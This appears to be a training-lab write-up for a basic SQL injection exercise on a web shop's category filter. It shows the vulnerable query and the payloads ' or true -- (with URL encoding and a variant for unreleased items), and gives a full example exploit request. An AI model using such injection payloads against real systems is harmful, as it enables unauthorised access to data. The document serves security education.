## Lab 1 Task Summary

The goal is to reveal *unreleased products* by exploiting the **category** feature.

The `category` parameter is inserted **unsafely** into an SQL query:

```sql
SELECT * FROM products 
WHERE category = 'Gifts' AND released = 1;
```

## Vulnerable Endpoint

The app takes:

```
GET /filter?category=<input>
```
Your input is concatenated directly into the SQL query 
### Payload
```
' or true --
```

**URL-encoded:**
```
%27%20or%20true%20--
```
## bonus payload
To get unreleased products only, use
```
' or true AND released = 0 --
```
### Example Exploit Request

``` http
GET /filter?category=%27%20or%20true%20-- HTTP/2
Host: 0a6d00980xxxxxxxxxxxxxxxx.web-security-academy.net
Cookie: session=xxxxxxxxxxxxxxxxxxxxxx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

[test out your payloads here](/labs/sql-injection/portswigger/lab-1_exploit.py)